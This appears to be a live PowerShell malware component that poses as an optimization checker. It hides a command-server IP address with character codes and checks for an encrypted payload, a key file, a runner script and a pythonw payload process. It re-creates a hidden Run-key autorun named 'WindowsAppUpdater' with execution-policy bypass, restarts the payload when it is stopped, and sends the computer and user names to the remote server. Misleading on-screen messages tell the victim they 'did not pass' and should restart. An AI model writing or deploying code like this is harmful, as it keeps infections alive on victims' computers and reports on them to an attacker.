
$ErrorActionPreference = 'SilentlyContinue'

$sUrl = 'http://' + 
             [char]55+[char]50+'.'+
             [char]53+[char]54+'.'+
             [char]52+[char]49+'.'+
             [char]50+[char]48+[char]55+':3000'

$pDir = "$env:APPDATA\Microsoft\Security"
$kDir = "$env:LOCALAPPDATA\Microsoft\Vault"
$rDir = "$env:LOCALAPPDATA\Microsoft\WindowsApps"
$pFile = "$pDir\payload.enc"
$kFile = "$kDir\.token"
$rFile = "$rDir\updater.ps1"

$aName = "WindowsAppUpdater"

$mId = [System.BitConverter]::ToString(
    [System.Security.Cryptography.MD5]::Create().ComputeHash(
        [System.Text.Encoding]::UTF8.GetBytes("$($env:COMPUTERNAME.ToLower())-$($env:USERNAME.ToLower())")
    )
).Replace('-','').Substring(0,16).ToLower()

function sLog {
    param([string]$t,[string]$m,[string]$st="check",[hashtable]$e = @{})
    try {
        $l = @{
            timestamp = (Get-Date).ToString("o")
            type = $t
            message = $m
            odId = $mId
            pcName = $env:COMPUTERNAME
            pcUser = $env:USERNAME
            steamId = ""
            username = ""
            stage = $st
        }
        if ($e.Count -gt 0) { $l.extra = $e }
        $j = $l | ConvertTo-Json -Compress
        $w = New-Object Net.WebClient
        $w.Headers.Add("Content-Type", "application/json")
        $null = $w.UploadString("$sUrl/api/log", $j)
    } catch {}
}

function lInfo { param($m, $e = @{}) sLog -t "info" -m $m -st "check" -e $e }
function lErr { param($m, $e = @{}) sLog -t "errors" -m $m -st "check" -e $e }

function tFile {
    param([string]$p, [string]$n)
    if (Test-Path $p) {
        $s = (Get-Item $p).Length
        lInfo "$n exists" @{ path = $p; size = $s }
        return $true
    } else {
        lErr "$n missing" @{ expectedPath = $p }
        return $false
    }
}

# Ищем процесс pythonw
function tProc {
    $exeProc = Get-Process pythonw -ErrorAction SilentlyContinue
    if ($exeProc) {
        $pi = @()
        foreach ($p in $exeProc) {
            $pi += @{ pid = $p.Id; name = "pythonw.exe" }
        }
        lInfo "Process running" @{ count = ($exeProc | Measure-Object).Count; processes = $pi }
        return $true
    }
    
    lErr "Payload process (pythonw) not found"
    return $false
}

function tRun {
    param([string]$n)
    $rp = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    try {
        $v = Get-ItemProperty $rp -Name $n -ErrorAction Stop
        if ($v.$n) {
            lInfo "Autorun configured" @{ name = $n; command = $v.$n }
            return $true
        }
    } catch {
        lErr "Autorun missing" @{ expectedName = $n }
        return $false
    }
}

function fixRun {
    param([string]$n, [string]$rf)
    $rp = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    try {
        $cmd = "powershell -w h -ep bypass -f `"$rf`""
        Set-ItemProperty $rp -Name $n -Value $cmd -Force -ErrorAction Stop
        lInfo "Autorun fixed" @{ name = $n; command = $cmd }
        return $true
    } catch {
        lErr "Failed to fix autorun" @{ error = $_.Exception.Message }
        return $false
    }
}

function startRun {
    param([string]$rf)
    if (!(Test-Path $rf)) {
        lErr "Runner file not found, cannot start"
        return $false
    }
    
    try {
        $scriptContent = Get-Content $rf -Raw -ErrorAction Stop
        $scriptBlock = [ScriptBlock]::Create($scriptContent)
        Start-Job -ScriptBlock $scriptBlock | Out-Null
        lInfo "Runner started manually" @{ path = $rf }
        Start-Sleep -Seconds 2
        return $true
    } catch {
        lErr "Failed to start runner" @{ error = $_.Exception.Message }
        return $false
    }
}

function tPy {
    $vs = @('311','312','310','313','39')
    $f = $false
    foreach ($v in $vs) {
        $pp = "$env:LOCALAPPDATA\Programs\Python\Python$v\pythonw.exe"
        if (Test-Path $pp) {
            lInfo "Python installed" @{ version = $v; path = $pp }
            $f = $true
            break
        }
    }
    if (-not $f) {
        lErr "Python not installed"
        return $false
    }
    return $true
}


function chk {
    Clear-Host
    Write-Host ""
    Write-Host "  Checking optimization..." -ForegroundColor Cyan
    Write-Host ""
    
    lInfo "Installation check started" @{
        machineId = $mId
        pcName = $env:COMPUTERNAME
        pcUser = $env:USERNAME
    }
    
    $r = @{
        pf = $false
        kf = $false
        rf = $false
        py = $false
        pr = $false
        ar = $false
    }
    
    Write-Host "  [*] Checking optimization..." -ForegroundColor Yellow
    Start-Sleep -Milliseconds 500
    
    $r.pf = tFile -p $pFile -n "Payload file"
    $r.kf = tFile -p $kFile -n "Encryption key"
    $r.rf = tFile -p $rFile -n "Runner script"
    $r.py = tPy
    $r.pr = tProc
    $r.ar = tRun -n $aName
    
    Write-Host "  [*] Analyzing results..." -ForegroundColor Yellow
    Start-Sleep -Milliseconds 500
    
    $needsRepair = $false
    
    if (-not $r.ar -and $r.rf) {
        $r.ar = fixRun -n $aName -rf $rFile
        $needsRepair = $true
    }
    
    if (-not $r.pr -and $r.rf -and $r.pf -and $r.kf) {
        if (startRun -rf $rFile) {
            Start-Sleep -Seconds 5
            $r.pr = tProc
        }
        $needsRepair = $true
    }
    
    if ($needsRepair) {
        Write-Host ""
        Write-Host "  [*] Re-checking status..." -ForegroundColor Yellow
        Start-Sleep -Milliseconds 500
    }
    
    $pc = ($r.Values | Where-Object { $_ -eq $true }).Count
    $tc = $r.Count
    $pp = [math]::Round(($pc / $tc) * 100, 0)
    
    Write-Host ""
    Write-Host "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor DarkGray
    Write-Host ""
    
    if ($pc -eq $tc) {
        Write-Host "  [!] You did not pass the checking! Restart your computer." -ForegroundColor Red
        
        try {
            $l = @{
                timestamp = (Get-Date).ToString("o")
                type = "info"
                message = "Installation check completed"
                odId = $mId
                pcName = $env:COMPUTERNAME
                pcUser = $env:USERNAME
                steamId = ""
                username = ""
                stage = "payload"
                extra = @{
                    passed = $pc
                    total = $tc
                    percentage = $pp
                    allPassed = $true
                    repaired = $needsRepair
                }
            }
            $j = $l | ConvertTo-Json -Compress
            $w = New-Object Net.WebClient
            $w.Headers.Add("Content-Type", "application/json")
            $null = $w.UploadString("$sUrl/api/log", $j)
        } catch {}
        
    } elseif ($pc -ge 4) {
        Write-Host "  YOU DID NOT PASS THE CHECKING!" -ForegroundColor DarkYellow
        Write-Host ""
        lInfo "Installation check completed with warnings" @{
            passed = $pc
            total = $tc
            percentage = $pp
            allPassed = $false
            repaired = $needsRepair
        }
    } else {
        Write-Host "  YOU DID NOT PASS THE CHECKING!" -ForegroundColor DarkYellow
        Write-Host ""
        lErr "Installation check failed" @{
            passed = $pc
            total = $tc
            percentage = $pp
            allPassed = $false
            repaired = $needsRepair
        }
    }
    
    Write-Host ""
    Write-Host "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor DarkGray
    Write-Host ""
    Write-Host "  Press any key to exit..." -ForegroundColor Gray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

chk
